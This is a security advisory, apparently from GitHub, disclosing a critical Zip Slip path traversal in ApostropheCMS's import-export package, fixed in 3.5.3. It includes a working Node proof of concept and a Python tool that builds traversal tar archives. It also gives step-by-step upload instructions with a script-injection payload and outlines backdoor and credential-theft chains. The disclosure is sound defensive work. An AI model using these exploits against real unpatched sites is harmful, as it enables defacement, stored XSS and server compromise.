# [C] ApostropheCMS has Arbitrary File Write (Zip Slip / Path Traversal) in Import-Export Gzip Extraction

## Summary
Severity: Critical
Advisory: GHSA-mwxc-m426-3f78
CVE: CVE-2026-32731
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-mwxc-m426-3f78
Type: github-advisory

## Affected
- npm: `@apostrophecms/import-export` — affected >=0 <3.5.3

## Details
**Reported:** 2026-03-08  
**Status:** patched and released in version 3.5.3 of `@apostrophecms/import-export`

---

## Product

| Field | Value |
|---|---|
| Repository | `apostrophecms/apostrophe` (monorepo) |
| Affected Package | `@apostrophecms/import-export` |
| Affected File | `packages/import-export/lib/formats/gzip.js` |
| Affected Function | `extract(filepath, exportPath)` — lines ~132–157 |
| Minimum Required Permission | **Global Content Modify** (any editor-level user with import access) |

---

## Vulnerability Summary

The `extract()` function in `gzip.js` constructs file-write paths using:

```js
fs.createWriteStream(path.join(exportPath, header.name))
```

`path.join()` does **not** resolve or sanitise traversal segments such as `../`. It concatenates them as-is, meaning a tar entry named `../../evil.js` resolves to a path **outside** the intended extraction directory. No canonical-path check is performed before the write stream is opened.

This is a textbook **Zip Slip** vulnerability. Any user who has been granted the **Global Content Modify** permission — a role routinely assigned to content editors and site managers — can upload a crafted `.tar.gz` file through the standard CMS import UI and write attacker-controlled content to **any path the Node.js process can reach on the host filesystem**.

---

## Security Impact

This vulnerability provides **unauthenticated-equivalent arbitrary file write** to any user with content editor permissions. The full impact chain is:

### 1. Arbitrary File Write
Write any file to any path the Node.js process user can access. Confirmed writable targets in testing:

- Any path the CMS process has permission to

### 2. Static Web Directory — Defacement & Malicious Asset Injection
ApostropheCMS serves `<project-root>/public/` via Express static middleware:

```js
// packages/apostrophe/modules/@apostrophecms/asset/index.js
express.static(self.apos.rootDir + '/public', self.options.static || {})
```

A traversal payload targeting `public/` makes any uploaded file **directly HTTP-accessible**:

This enables:
- Full site defacement
- Serving phishing pages from the legitimate CMS domain
- Injecting malicious JavaScript served to all site visitors (stored XSS at scale)

### 3. Persistent Backdoor / RCE (Post-Restart)
If the traversal targets any `.js` file loaded by Node.js on startup (e.g., a module `index.js`, a config file, a routes file), the payload becomes a **persistent backdoor** that executes with the CMS process privileges on the next server restart. In container/cloud environments, restarts happen automatically on deploy, crash, or health-check failure — meaning the attacker does not need to manually trigger one.

### 4. Credential and Secret File Overwrite
Overwrite `.env`, `app.config.js`, database seed files, or any config file to:
- Exfiltrate database credentials on next load
- Redirect authentication to an attacker-controlled backend
- Disable security controls (rate limiting, MFA, CSRF)

### 5. Denial of Service
Overwrite any critical application file (`package.json`, `node_modules` entries, etc.) with garbage data, rendering the application unbootable.

---

## Required Permission

**Global Content Modify** — this is a standard editor-level permission routinely granted to content managers, blog editors, and site administrators in typical ApostropheCMS deployments. It is **not** an administrator-only capability. Any organisation that delegates content editing to non-technical staff is exposed.

---

## Proof of Concept

Two PoC artifacts are provided:

| File | Purpose |
|---|---|
| `tmp-import-export-zip-slip-poc.js` | Automated Node.js harness — verifies the write happens without a browser |
| `make-slip-tar.py` | Attacker tool — generates a real `.tar.gz` for upload via the CMS web UI |

---

### PoC 1 — Automated Verification (`tmp-import-export-zip-slip-poc.js`)

```js
const fs = require('node:fs');
const fsp = require('node:fs/promises');
const path = require('node:path');
const os = require('node:os');
const zlib = require('node:zlib');
const tar = require('tar-stream');

const gzipFormat = require('./packages/import-export/lib/formats/gzip.js');

async function makeArchive(archivePath) {
  const pack = tar.pack();
  const gzip = zlib.createGzip();
  const out = fs.createWriteStream(archivePath);

  const done = new Promise((resolve, reject) => {
    out.on('finish', resolve);
    out.on('error', reject);
    gzip.on('error', reject);
    pack.on('error', reject);
  });

  pack.pipe(gzip).pipe(out);

  pack.entry({ name: 'aposDocs.json' }, '[]');
  pack.entry({ name: 'aposAttachments.json' }, '[]');

  // Traversal payload
  pack.entry({ name: '../../zip-slip-pwned.txt' }, 'PWNED_FROM_TAR');

  pack.finalize();
  await done;
}

(async () => {
  const base = await fsp.mkdtemp(path.join(os.tmpdir(), 'apos-zip-slip-'));
  const archivePath = path.join(base, 'evil-export.gz');
  const exportPath = archivePath.replace(/\.gz$/, '');

  await makeArchive(archivePath);

  const expectedOutsideWrite = path.resolve(exportPath, '../../zip-slip-pwned.txt');

  // Ensure clean pre-state
  try { await fsp.unlink(expectedOutsideWrite); } catch (_) {}

  await gzipFormat.input(archivePath);

  const exists = fs.existsSync(expectedOutsideWrite);
  const content = exists ? await fsp.readFile(expectedOutsideWrite, 'utf8') : '';

  console.log('EXPORT_PATH:', exportPath);
  console.log('EXPECTED_OUTSIDE_WRITE:', expectedOutsideWrite);
  console.log('ZIP_SLIP_WRITE_HAPPENED:', exists);
  console.log('WRITTEN_CONTENT:', content.trim());
})();
```
**Run:**
```powershell
node .\tmp-import-export-zip-slip-poc.js
```

**Observed output (confirmed):**
```
EXPORT_PATH:            C:\Users\...\AppData\Local\Temp\apos-zip-slip-XXXXXX\evil-export
EXPECTED_OUTSIDE_WRITE: C:\Users\...\AppData\Local\Temp\zip-slip-pwned.txt
ZIP_SLIP_WRITE_HAPPENED: true
WRITTEN_CONTENT:        PWNED_FROM_TAR
```

The file `zip-slip-pwned.txt` is written **two directories above** the extraction root, confirming path traversal.

---

### PoC 2 — Web UI Exploitation (`make-slip-tar.py`)

**Script (`make-slip-tar.py`):**
```python
import tarfile, io, sys

if len(sys.argv) != 3:
    print("Usage: python make-slip-tar.py <payload_file> <target_path>")
    sys.exit(1)

payload_file = sys.argv[1]
target_path  = sys.argv[2]
out = "evil-slip.tar.gz"

with open(payload_file, "rb") as f:
    payload = f.read()

with tarfile.open(out, "w:gz") as t:
    docs = io.BytesIO(b"[]")
    info = tarfile.TarInfo("aposDocs.json")
    info.size = len(docs.getvalue())
    t.addfile(info, docs)

    atts = io.BytesIO(b"[]")
    info = tarfile.TarInfo("aposAttachments.json")
    info.size = len(atts.getvalue())
    t.addfile(info, atts)

    info = tarfile.TarInfo(target_path)
    info.size = len(payload)
    t.addfile(info, io.BytesIO(payload))

print("created", out)
```

---

## Steps to Reproduce (Web UI — Real Exploitation)

### Step 1 — Create the payload file

Create a file with the content you want to write to the server. For a static web directory write:

```bash
echo "<!-- injected by attacker --><script>alert('XSS')</script>" > payload.html
```

### Step 2 — Generate the malicious archive

Use the traversal path that reaches the CMS `public/` directory. The number of `../` segments depends on where the CMS stores its temporary extraction directory relative to the project root — typically 2–4 levels up. Adjust as needed:

```bash
python make-slip-tar.py payload.html "../../../../<project-root>/public/injected.html"
```

This creates `evil-slip.tar.gz` containing:
- `aposDocs.json` — empty, required by the importer
- `aposAttachments.json` — empty, required by the importer
- `../../../../<project-root>/public/injected.html` — the traversal payload

### Step 3 — Upload via CMS Import UI

1. Log in to the CMS with any account that has **Global Content Modify** permission.
2. Navigate to **Open Global Settings → More Options → Import**.
3. Select `evil-slip.tar.gz` and click **Import**.
4. The CMS accepts the file and begins extraction — no error is shown.

### Step 4 — Confirm the write

```bash
curl http://localhost:3000/injected.html
```

Expected response:
```
<!-- injected by attacker --><script>alert('XSS')</script>
```

The file is now being served from the CMS's own domain to all visitors.

### Video POC : https://drive.google.com/file/d/1bbuQnoJv_xjM_uvfjnstmTh07FB7VqGH/view?usp=sharing
---

## References
- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-mwxc-m426-3f78
- https://github.com/apostrophecms/apostrophe
